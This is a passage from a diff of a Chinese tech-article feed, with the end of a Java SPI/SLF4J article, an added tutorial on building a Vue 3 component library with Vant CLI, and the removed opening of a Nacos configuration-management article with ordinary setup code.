&lt;span&gt;&amp;lt;&lt;span&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;org.slf4j&lt;span&gt;&amp;lt;/&lt;span&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&amp;lt;&lt;span&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;slf4j-api&lt;span&gt;&amp;lt;/&lt;span&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&amp;lt;&lt;span&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;2.0.3&lt;span&gt;&amp;lt;/&lt;span&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&amp;lt;/&lt;span&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&amp;lt;&lt;span&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&amp;lt;&lt;span&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;org.slf4j&lt;span&gt;&amp;lt;/&lt;span&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&amp;lt;&lt;span&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;slf4j-log4j12&lt;span&gt;&amp;lt;/&lt;span&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&amp;lt;&lt;span&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;2.0.3&lt;span&gt;&amp;lt;/&lt;span&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&amp;lt;/&lt;span&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;引入项目后，点开它的jar包看一下具体结构：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5280701754385965&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/zpom4BeZSicZUOEzJAic3O79nCyjV9pzgvxMMqIrpO7wlicS3DSMr9WcHGXY9kunxXEqc5RgaPANJv7rZdHm3gAzg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1140&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;有没有发现一个彩蛋，先说为什么我们pom中引入的明明是&lt;code&gt;slf4j-log4j12&lt;/code&gt;，实际上引入的是&lt;code&gt;slf4j-reload4j&lt;/code&gt;？翻一下官网的文档：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.3105196451204056&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/zpom4BeZSicZUOEzJAic3O79nCyjV9pzgviaXF5VXaPPpfWPQ7QU8AGrdHl3k52AjRGibsTXS6jSysdVvI4Y0SmoYg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;789&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;大意就是在2015年和2022年，&lt;code&gt;log4j1.x&lt;/code&gt;就已经宣布&lt;code&gt;end of life&lt;/code&gt;终止了，原因也不难猜，估计是因为频繁爆出的漏洞。在那之后，&lt;code&gt;slf4j-log4j&lt;/code&gt;在构建阶段就会自动重定向到&lt;code&gt;slf4j-reload4j&lt;/code&gt;了，并且官方也强烈建议使用&lt;code&gt;slf4j-reload4j&lt;/code&gt;作为替代。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;再回头看一下jar包的&lt;code&gt;META-INF.services&lt;/code&gt;里面，通过spi注入了&lt;code&gt;Reload4jServiceProvider&lt;/code&gt;这个实现类，它实现了&lt;code&gt;SLF4JServiceProvider&lt;/code&gt;这一接口，在它的初始化方法&lt;code&gt;initialize()&lt;/code&gt;中，会完成初始化等工作，后续可以继续获取到&lt;code&gt;LoggerFactory&lt;/code&gt;和&lt;code&gt;Logger&lt;/code&gt;等具体日志对象。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;7、总结&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;Java中的SPI提供了一种比较特别的服务发现和调用机制，通过接口灵活的将服务调用与服务提供者分离，用于提供给第三方实现扩展时还是很方便的。但是也有缺点，比方说一旦加载一个接口，就会把所有实现类都加载进来，可能会加载到不需要的冗余服务。不过站在整体角度上，还是给我们提供了一种非常不错的框架扩展、集成的思路。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;那么，这次的分享就到这里，我是Hydra，我们下篇再见。&lt;/p&gt;&lt;/section&gt;&lt;/div&gt;&lt;/div&gt;</content:encoded>
+</item>
+<item>
+<guid>6f080f8861e2e9be746ff6c13a2c6ad9</guid>
+<title>如何从 0 开始搭建 Vue 组件库</title>
+<link>https://toutiao.io/k/i15vxw7</link>
+<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;preview&quot;&gt;&lt;p&gt;作者：京东零售 陈艳春&lt;/p&gt;
+
+&lt;h2&gt;&lt;strong&gt;前言：&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;组件设计是通过对功能及视觉表达中元素的拆解、归纳、重组，并基于可被复用的目的，形成规范化的组件，通过多维度组合来构建整个设计方案，將这些组件整理在一起，便形成组件库。本文我们主要讲述基于Vant CLI的自建组件库。Vant CLI 是一个基于 Vite 实现的 Vue 组件库构建工具，通过 Vant CLI 可以快速搭建一套功能完备的 Vue 组件库。&lt;/p&gt;
+
+&lt;h2&gt;&lt;strong&gt;建立组件库的意义&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;p&gt;首先组件库可以给我们降本提效，其次可以保持视觉风格统一以及交互一致，可以帮助我们快速构建使用场景，便于多个项目后续迭代升级 。&lt;/p&gt;
+
+&lt;p&gt;视觉风格统一以及交互的一致性，可以减少用户学习成本培养用户习惯，让产品拥有良好的用户体验。比如一个四级地址的选择组件，在整个产品中应该就一种交互方式，如果一会是滚动选择，一会是点击选择，会让用户操作起来比较烦躁，统一交互可以减少用户学习成本。&lt;/p&gt;
+
+&lt;p&gt;新产品上线后，还需要不断的去完善，在迭代过程中可能会新增其他功能，这时候我们就可以只修改组件库一套代码，所有不同项目相同组件就可以达到了迭代升级的效果。&lt;/p&gt;
+
+&lt;h2&gt;&lt;strong&gt;如何创建组件库&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;h3&gt;&lt;strong&gt;一、梳理组件清单&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;p&gt;首先梳理出项目中样式相同的模块，和产品讨论未来会有哪些规划，现有的组件是否能够满足需求，是否需要补充设计方案，清单整理完毕后，将每一个组件建成一个独立任务，像日常需求那样，方便随时更新使用。&lt;/p&gt;
+
+&lt;h3&gt;&lt;strong&gt;二、场景整合&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;p&gt;把自己变成产品的深度用户，把现有线上产品完整体验一遍，绘制用户行为路径，并和需求方沟通了解后续计划，将组件的所有的当前/潜在应用场景总结出来，尽可能不遗漏场景。&lt;/p&gt;
+
+&lt;h3&gt;&lt;strong&gt;三、组件库框架选型&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;p&gt;看了开源的 Vue3 组件库，总结了一些前端目前流行的趋势，列出来多个版本和框架的，本文只讨论 Vue3 版本。&lt;/p&gt;
+
+&lt;p&gt;1.element-plus - 经典中的经典，全面支持 Vue 3&lt;/p&gt;
+
+&lt;p&gt;2.tdesign-vue-next - 鹅厂优质 UI 组件，配套工具完满，设计工整，文档清晰&lt;/p&gt;
+
+&lt;p&gt;3.arco-design-vue- 字节跳动开源 UI 组件库，大厂逻辑，设计文档完美&lt;/p&gt;
+
+&lt;p&gt;4.ant-design-vue - 蚂蚁前端 UI 库，面向企业级中后台&lt;/p&gt;
+
+&lt;p&gt;5.naive-ui - 宝藏 Vue UI 库，Vue UI 新星，从 Vue 3 起步&lt;/p&gt;
+
+&lt;p&gt;6.vant - 有赞团队开源移动 UI 组件库，全面支持 Vue 3&lt;/p&gt;
+
+&lt;p&gt;7.nutui - 京东出品，移动端友好，面向电商业务场景&lt;/p&gt;
+
+&lt;p&gt;8.vuetify - 老牌 Vue UI ，基于谷歌的 Material Design 样式开发&lt;/p&gt;
+
+&lt;p&gt;9.varlet - Varlet 是一个基于 Vue3 开发的 Material 风格移动端组件库，全面拥抱 Vue3 生态，由社区建立起来的组件库团队进行维护。&lt;/p&gt;
+
+&lt;h3&gt;&lt;strong&gt;四、组件库搭建&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;p&gt;我们以Vant CLI为例来详细剖析具体搭建过程:&lt;/p&gt;
+
+&lt;h4&gt;&lt;strong&gt;（1）首先确保本地node版本^12.13.0 || ^14.15.0 || &amp;gt;=16.0.0&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;h4&gt;&lt;strong&gt;（2）执行以下命令可以快速创建一个基于 Vant CLI 的项目&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;yarn create vant-cli-app
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4&gt;&lt;strong&gt;（3）手动安装&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;# 通过 npm
+npm i @vant/cli -D
+
+# 通过 yarn
+yarn add @vant/cli -D
+
+# 通过 pnpm
+pnpm add @vant/cli -D
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4&gt;&lt;strong&gt;（4）手动配置&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code&gt;{
+  &quot;scripts&quot;: {
+    &quot;dev&quot;: &quot;vant-cli dev&quot;,
+    &quot;test&quot;: &quot;vant-cli test&quot;,
+    &quot;lint&quot;: &quot;vant-cli lint&quot;,
+    &quot;build&quot;: &quot;vant-cli build&quot;,
+    &quot;prepare&quot;: &quot;husky install&quot;,
+    &quot;release&quot;: &quot;vant-cli release&quot;,
+    &quot;build-site&quot;: &quot;vant-cli build-site&quot;
+  },
+  &quot;nano-staged&quot;: {
+    &quot;*.md&quot;: &quot;prettier --write&quot;,
+    &quot;*.{ts,tsx,js,vue,less,scss}&quot;: &quot;prettier --write&quot;,
+    &quot;*.{ts,tsx,js,vue}&quot;: &quot;eslint --fix&quot;
+  },
+  &quot;eslintConfig&quot;: {
+    &quot;root&quot;: true,
+    &quot;extends&quot;: [&quot;@vant&quot;]
+  },
+  &quot;prettier&quot;: {
+    &quot;singleQuote&quot;: true
+  },
+  &quot;browserslist&quot;: [&quot;Chrome &amp;gt;= 51&quot;, &quot;iOS &amp;gt;= 10&quot;]
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4&gt;&lt;strong&gt;（5）本地启动&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;npm run dev启动项目，页面如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b370cbd3f56e4848b0b5410705065f02%7Etplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+
+&lt;p&gt;注：介绍、快速上手、定制主题、编码规范、开发指南是根据自己组内的规范编写。&lt;/p&gt;
+
+&lt;h4&gt;&lt;strong&gt;（6）如何开发组件库&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;h5&gt;&lt;strong&gt;目录结构&lt;/strong&gt;&lt;/h5&gt;
+
+&lt;p&gt;•仓库的组件代码位于 src 下，每个组件一个文件夹&lt;/p&gt;
+
+&lt;p&gt;•docs 目录下是文档网站的代码，本地开发时可以在目录下运行 npm run dev 开启文档网站&lt;/p&gt;
+
+&lt;p&gt;项目主要目录如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;m-tetris
+├─ build     # 构建
+├─ docs      # 文档
+├─ es        # 打包
+├─ lib       # 打包
+├─ site      # 静态站点资源
+├─ src       # 组件
+├─ test      # 单测
+└─ static    # 图片等资源
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5&gt;&lt;strong&gt;添加新组件&lt;/strong&gt;&lt;/h5&gt;
+
+&lt;p&gt;添加新组件时，请按照下面的目录结构组织文件，并在 &lt;code&gt;vant.config.js&lt;/code&gt; 中配置组件名称。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;src
+└─ button
+   ├─ demo             # 示例代码
+   ├─ test             # 单元测试
+   ├─ index.vue        # 组件入口
+   ├─ index.less       # 组件样式
+   └─ README.md        # 组件文档说明
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h5&gt;&lt;strong&gt;本地测试&lt;/strong&gt;&lt;/h5&gt;
+
+&lt;pre&gt;&lt;code&gt;# 打包,生成lib es文件夹
+npm run build
+
+# 生成压缩包
+npm pack
+
+# 在项目中安装测试包
+npm install 压缩包的绝对路径（例如：/Users/用户名/work/XXX/XXX.0.tgz）
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3&gt;&lt;strong&gt;五、如何发布到公司npm私服或者npm官网&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;p&gt;所有公司内网用户都能够发布包到 jnpm 库。&lt;/p&gt;
+
+&lt;p&gt;如果你之前没有发布包的经验，请先查看 npm 官方文档 &lt;a href=&quot;https://docs.npmjs.com/cli/publish&quot;&gt;npm publish&lt;/a&gt; 。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# 拉取最新的master
+# 构建npm包
+npm run build
+
+# 登录（如已登录，请忽略）
+npm login
+
+# 发布
+# 如果是公司私服、请保证源是公司源
+npm publish
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3&gt;&lt;strong&gt;六、如何在项目中使用组件&lt;/strong&gt;&lt;/h3&gt;
+
+&lt;h4&gt;&lt;strong&gt;方式一. 自动按需引入组件 (推荐)&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;﻿&lt;a href=&quot;https://github.com/ant-design/babel-plugin-import&quot;&gt;babel-plugin-import&lt;/a&gt; 是一款 babel 插件，它会在编译过程中将 import 的写法自动转换为按需引入的方式。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# 安装插件
+npm i babel-plugin-import -D
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;// 在.babelrc 中添加配置
+// 注意：webpack 1 无需设置 libraryDirectory
+{
+  &quot;plugins&quot;: [
+    [&quot;import&quot;, {
+      &quot;libraryName&quot;: &quot;xxx-vant&quot;,
+      &quot;libraryDirectory&quot;: &quot;es&quot;,
+      &quot;style&quot;: true
+    }]
+  ]
+}
+
+// 对于使用 babel7 的用户，可以在 babel.config.js 中配置
+module.exports = {
+  plugins: [
+    [&#x27;import&#x27;, {
+      libraryName: &#x27;xxx-vant&#x27;,
+      libraryDirectory: &#x27;es&#x27;,
+      style: true
+    }, &#x27;xxx-vant&#x27;]
+  ]
+};
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;// 接着你可以在代码中直接引入 xxx-vant 组件
+// 插件会自动将代码转化为方式二中的按需引入形式
+import { IndexBar } from &#x27;xxx-vant&#x27;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4&gt;&lt;strong&gt;方式二. 手动按需引入组件&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;在不使用插件的情况下，可以手动引入需要的组件。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;import Button from &#x27;xxx-vant/lib/index-bar&#x27;;
+import &#x27;xxx-vant/lib/index-bar/style&#x27;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4&gt;&lt;strong&gt;方式三. 导入所有组件&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;xxx-vant 支持一次性导入所有组件，引入所有组件会增加代码包体积，因此不推荐这种做法。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;import Vue from &#x27;vue&#x27;;
+import Jdxxx from &#x27;xxx-vant&#x27;;
+import &#x27;xxx-vant/lib/index.css&#x27;;
+
+Vue.use(Jdxxx);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;﻿  &lt;/p&gt;
+
+&lt;p&gt;参考资料：vant-cli官网：&lt;a href=&quot;https://github.com/youzan/vant/blob/HEAD/packages/vant-cli/README.zh-CN.md&quot;&gt;https://github.com/youzan/vant/blob/HEAD/packages/vant-cli/README.zh-CN.md&lt;/a&gt;&lt;/p&gt;
 &lt;/div&gt;
-    &lt;/div&gt;&lt;/div&gt;</content:encoded>
-</item>
-<item>
-<guid>101e97cb6903561ed933caf8f46bac5e</guid>
-<title>Nacos 配置管理最佳实践</title>
-<link>https://toutiao.io/k/1traalp</link>
-<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;RichText ztext Post-RichText css-1g0fqss&quot; options=&quot;[object Object]&quot;&gt;&lt;h2 data-first-child=&quot;&quot;&gt;Nacos 简介&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d96af18c14c1ba7c03648e3f6aa2af5b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;515&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic4.zhimg.com/v2-d96af18c14c1ba7c03648e3f6aa2af5b_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;515&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic4.zhimg.com/v2-d96af18c14c1ba7c03648e3f6aa2af5b_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-d96af18c14c1ba7c03648e3f6aa2af5b_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;4KM9VilT&quot;&gt;Nacos 是一个更易于构建云原生应用的微服务基础平台，核心包含动态服务发现，配置管理，服务管理平台。&lt;/p&gt;&lt;p data-pid=&quot;Lroy-YIN&quot;&gt;配置管理是 Nacos 的核心功能，它提供了运行期不重启应用的情况下动态修改配置值的功能。&lt;/p&gt;&lt;h2&gt;Nacos 配置中心发展历程&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b232100fff56b6761b88ea2e37ec5851_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;626&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic2.zhimg.com/v2-b232100fff56b6761b88ea2e37ec5851_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;626&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic2.zhimg.com/v2-b232100fff56b6761b88ea2e37ec5851_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-b232100fff56b6761b88ea2e37ec5851_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;OHVgMq6P&quot;&gt;Nacos 配置中心是从阿里集团内配置中心 Diamond 孵化而来，其整体发展分为三个阶段：&lt;/p&gt;&lt;h3&gt;1.阿里集团内部孵化期&lt;/h3&gt;&lt;p data-pid=&quot;gQCpfw8K&quot;&gt;nacos 配置中心诞生于阿里巴巴集团内部的配置中心 Diamond，前期主要服务于集团内部对动态配置的需求。&lt;/p&gt;&lt;h3&gt;2.开源&amp;amp;商业化探索尝试&lt;/h3&gt;&lt;p data-pid=&quot;-Q27Qa-o&quot;&gt;集团 Diamond 经历了从开源再到闭源的过程，发布了商业化产品 ACM，并在 2018 年以 Nacos 配置中心为载体再次开源，期间对配置中心的开源及商业化进行了探索。&lt;/p&gt;&lt;h3&gt;3.三位一体融合发展&lt;/h3&gt;&lt;p data-pid=&quot;2HqXS8D-&quot;&gt;明确三位一体发展战略，以开源 Nacos 为内核，插件化支持集团 Diamond &amp;amp;商业化 MSE 定制的配置中心，三位一体融合发展。&lt;/p&gt;&lt;p data-pid=&quot;jx50TTSc&quot;&gt;&lt;b&gt;开源&lt;/b&gt;：以开源 Nacos 2.0 为内核，重构通信协议，性能扩展性提升10倍，支持 10w 级实例规模，提升开放性，联合开源微服务生态共同发展。&lt;/p&gt;&lt;p data-pid=&quot;_wXqPktM&quot;&gt;&lt;b&gt;商业化&lt;/b&gt;：支持 Nacos2.0 和专业版，目前 20% 用户升级到 Nacos2.0，并且支持配置鉴权和加密能力，推送轨迹等高级功能。&lt;/p&gt;&lt;p data-pid=&quot;vEHb4rdc&quot;&gt;&lt;b&gt;集团&lt;/b&gt;：关注性能和高可用能力，支持大促 1 小时建站，10 分钟支持响应；完成 Diamond Over Nacos2.0 架构演进，扩展性提升 1 倍，支持 500w 实例规模。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f033a1f4884f9bb57e3ef573a1023a95_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;987&quot; data-rawheight=&quot;547&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic2.zhimg.com/v2-f033a1f4884f9bb57e3ef573a1023a95_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;987&quot; data-rawheight=&quot;547&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic2.zhimg.com/v2-f033a1f4884f9bb57e3ef573a1023a95_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-f033a1f4884f9bb57e3ef573a1023a95_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;应用场景&amp;amp;双十一实践&lt;/h2&gt;&lt;p data-pid=&quot;2G4W0Hzt&quot;&gt;Nacos 配置管理应用场景&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7a5006df97613cd800012e345ce1372c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;613&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic1.zhimg.com/v2-7a5006df97613cd800012e345ce1372c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;613&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic1.zhimg.com/v2-7a5006df97613cd800012e345ce1372c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-7a5006df97613cd800012e345ce1372c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;rLY1Dh2n&quot;&gt;配置中心在业务域，基础技术域都有着广泛的应用，包括业务应用的开关，微服务生态的服务路由及元数据，高可用生态的预案，切流规则及降级开关等，前端生态的各类文案公告，数据库生态的核心配置参数，动态切库等配置。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4e597ebd4e9dc44fd25e8a49f9fa98a0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;648&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic1.zhimg.com/v2-4e597ebd4e9dc44fd25e8a49f9fa98a0_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;648&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic1.zhimg.com/v2-4e597ebd4e9dc44fd25e8a49f9fa98a0_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-4e597ebd4e9dc44fd25e8a49f9fa98a0_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;sHwK8C2l&quot;&gt;在每年阿里集团的双十一大促中，配置中心也是一个不可或缺的基础组件，包括前期热点商品推送，大促氛围活动标调整，大促期间数据库主备切换开关，核心功能降级，各类名单调整，预案限流调整，各种基础中间件的核心参数动态，大促结束后各类预案的恢复，大促态到日常态的状态切换，都是配置中心所支持的场景。&lt;/p&gt;&lt;h2&gt;配置中心使用指引&lt;/h2&gt;&lt;h3&gt;1.配置中心原理&lt;/h3&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3d8af0bda4e1e5ba674d11272f0a5bb7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;543&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic4.zhimg.com/v2-3d8af0bda4e1e5ba674d11272f0a5bb7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;543&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic4.zhimg.com/v2-3d8af0bda4e1e5ba674d11272f0a5bb7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-3d8af0bda4e1e5ba674d11272f0a5bb7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;ul&gt;&lt;li data-pid=&quot;zqNM4d-7&quot;&gt;业务应用：nacos 的使用方，通过 nacos-client 实现配置的发布，查询，监听回调的等基础操作。&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;VPnLBIW_&quot;&gt;负载均衡 SLB：与后端的 nacos 服务节点进行交互的地址，在用户自建或者调试的场景下，也可以采用直连 IP 或者地址服务器 endpoint 的模式。&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;ISy-3TKX&quot;&gt;Nacos Server：nacos 服务端存储当前集群全量配置的内存和磁盘缓存，集群节点之间进行水平通知配置变更事件，和后端数据库进行对账保证数据一致性。&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;SoCcODnv&quot;&gt;Nacos 控制台：管理控制台，可以进行配置查看，配置发布，监听查询等运维功能。商业化 Nacos 支持推送轨迹，监控，事件中心等高级功能。&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;HxsKfDx4&quot;&gt;数据库：配置持久化存储的数据库，一般是主备库架构进行容灾。&lt;/li&gt;&lt;/ul&gt;&lt;p data-pid=&quot;bhiMe1MI&quot;&gt;用户在接入 nacos 主要有两种模式，一种是通过原生 nacos-client 的 ConfigService 组件的基础 API 接入，第二种是通过 Spring 框架或者其他类似框架组件接入，包括 SpringCloud 和 SpringBoot 等。&lt;/p&gt;&lt;h3&gt;2.基础 API 接入&lt;/h3&gt;&lt;p data-pid=&quot;sKgrkzcs&quot;&gt;nacos 配置中心以 NacosConfigService 接口对外提供基础 API，包括配置发布，查询，监听，回调等基础功能。&lt;/p&gt;&lt;p data-pid=&quot;jUI9tXbq&quot;&gt;在构建 ConfigService 时需要指定 Nacos 的服务端地址，需要访问的命名空间。更多的 API 使用细节，可参照官方文档。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;Properties properties = new Properties();
-properties.put(PropertyKeyConst.SERVER_ADDR, &quot;127.0.0.1&quot;);
-properties.put(PropertyKeyConst.NAMESPACE, &quot;namespaceId&quot;);
-
-final ConfigService configService = new NacosConfigService(properties);
-final String dataId = &quot;my-config-dataId&quot;;
-final String group = &quot;group&quot;;
-//初始化查询配置，并添加监听器，监听后续变更
-String config = configService.getConfigAndSignListener(dataId, group, 3000L, new Listener() {
-    @Override
-    public Executor getExecutor() {
-        //如果回调逻辑比较耗时，建议自定义线程池，以免堵塞推送回调线程
-        return null;
-    }
-            
-    @Override
-    public void receiveConfigInfo(String configInfo) {
-        handleBusinessLogic(configInfo);
-    }
-});
-
-//初始化业务逻辑.
-handleBusinessLogic(config);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3&gt;3.SpringCloud 接入&lt;/h3&gt;&lt;p data-pid=&quot;i5w3JIlm&quot;&gt;新增 bootstrap.yml,配置 nacos 相关参数，包括 nacos 地址，命令空间等参数，具体可参照 com.alibaba.cloud.nacos.NacosConfigProperties 属性类。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;spring:
-  application:
-    name: nacos-config-demo
-  cloud:
-    nacos:
-      config:
-        server-addr: 127.0.0.1:8848
-        namespace: namespaceid-对应nacos服务端的命名空间ID,public填空
-        group: group-demo
